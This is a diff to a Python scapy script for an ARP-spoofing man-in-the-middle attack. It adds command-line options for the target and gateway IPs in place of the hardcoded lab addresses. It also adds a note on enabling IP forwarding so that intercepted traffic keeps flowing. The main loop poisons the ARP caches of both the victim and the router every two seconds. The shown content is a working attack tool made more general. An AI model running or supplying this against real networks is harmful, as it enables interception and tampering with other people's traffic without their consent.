@@ -4,23 +4,46 @@
 | Description:
     Spoofs router and victim MAC address using MITM attack.
 | Usage:
-    $ python apr_spoofer.py
+    $ python arp_spoofer.py
     $ ./arp_spoofer.py
 | Version:
-    3
+    4
 | Notes:
+    Enable IP forwarding through attacker machine to enable to
+    target_ip to talk to gateway_ip:
+        $ echo 1 > /proc/sys/net/ipv4/ip_forward
+        
     IndexError: list index out of range when scanning non-existant
     IP addresses.
 | Algorithm:
      
 | Variables:
     ip
-    packet
-    router_mac
+    target_ip
+    gateway_ip
+    spoof_ip
 """
 
 import scapy.all as scapy
 import time
+import argparse
+
+def get_arguments():
+    '''
+    Get arp_spoofer.py arguments passed from user input.
+    Returns parser object's stored objects passed from user input.
+    '''
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target_ip", help="Set IP address of target machine")
+    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Set IP address of router gateway")
+    args = parser.parse_args()    
+    if not args.target_ip:
+        parser.error("[-] Please specify a target IP address, use --help for more info.")
+    if not args.gateway_ip:
+        parser.error("[-] Please specify a gateway IP address, use --help for more info.")
+    return args
+
+
 
 def get_mac(ip):
     '''
@@ -53,8 +76,11 @@ def spoof(target_ip, spoof_ip):
 
 #--------------[ MAIN ]--------------
 
+args = get_arguments()
 
 while True:
-    spoof("10.0.2.4", "10.0.2.1")
-    spoof("10.0.2.1", "10.0.2.4")
+    spoof(args.target_ip, args.gateway_ip)
+    spoof(args.gateway_ip, args.target_ip)
     time.sleep(2)
+
+
